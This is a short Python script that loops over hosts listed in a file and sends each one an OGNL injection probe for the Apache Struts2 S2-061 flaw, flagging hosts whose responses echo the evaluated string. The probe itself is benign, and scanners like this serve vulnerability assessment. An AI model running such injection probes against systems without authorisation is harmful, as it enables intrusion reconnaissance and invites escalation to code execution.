
import requests
try:
    f = open("host.txt", 'r')  # 读取txt里的ip
    sourceInLines = f.readlines()
    f.close()
    # url='http://192.168.31.50:8080/'
    a='test2020'
    for line in sourceInLines:
            if line == '\n':
                continue
            url = line.strip('\n')
            #print(url)
            payload='?id=%25%7b+%27test%27+%2b+(2000+%2b+20).toString()%7d'
            end_url=url+payload
            resp=requests.get(end_url)
            print('正在检测>>\n',end_url,'\n')
            resp=resp.text

            if a in resp:

                print('{0} 【+】exists S2-061，vulnerable'.format(url))

finally:
    print("检测完成")